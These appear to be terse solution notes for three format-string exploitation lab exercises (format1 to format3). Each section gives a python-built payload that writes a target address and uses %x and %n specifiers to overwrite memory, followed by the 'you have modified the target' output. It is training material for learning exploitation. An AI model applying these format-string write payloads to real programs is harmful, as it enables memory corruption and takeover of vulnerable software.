# Format 1 #

```bash
 - Search for the pattern
./format1 $(python -c 'print "CCCCABCD"')%130\$x
CCCCABCD43434343

 - it works
./format1 $(python -c 'print "\x08\x04\x96\x38"[::-1] + "ABCD"')%130\$x
8ABCD8049638

 - The adresse is for target
./format1 $(python -c 'print "\x08\x04\x96\x38"[::-1] + "ABCD"')%130\$n
8ABCDyou have modified the target :)
```

# Format 2 #

```bash
echo `python -c 'print "\x08\x04\x96\xe4"[::-1] + "%44x"  +"%x"*2 + "%n"'` | ./format2
200b7fd8420bffff624
you have modified the target :)

```

# Format 3 #
Y a surement plus propre car là c'est un poil bourrin.

```bash
echo `python -c 'print "\x08\x04\x96\xf4"[::-1] + "%x"*10 + "%16930059x" + "%n"'` | ./format3
you have modified the target :)
``
